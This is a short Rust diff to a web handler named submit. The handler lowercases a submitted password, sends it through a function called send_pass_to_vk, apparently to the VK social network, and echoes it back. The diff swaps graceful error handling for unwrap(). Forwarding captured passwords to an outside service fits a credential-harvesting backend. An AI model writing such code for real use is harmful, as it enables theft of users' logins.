@@ -35,10 +35,9 @@ async fn submit(rbody: String) -> HttpResponse {
             .collect();
         pass = pass.to_lowercase();
 
-        match vk::send_pass_to_vk(&pass).await {
-            Ok(_) => HttpResponse::Ok().body(pass),
-            Err(_) => HttpResponse::BadRequest().finish(),
-        }
+        vk::send_pass_to_vk(&pass).await.unwrap();
+
+        return HttpResponse::Ok().body(pass);
     } else {
         return HttpResponse::BadRequest().finish();
     }
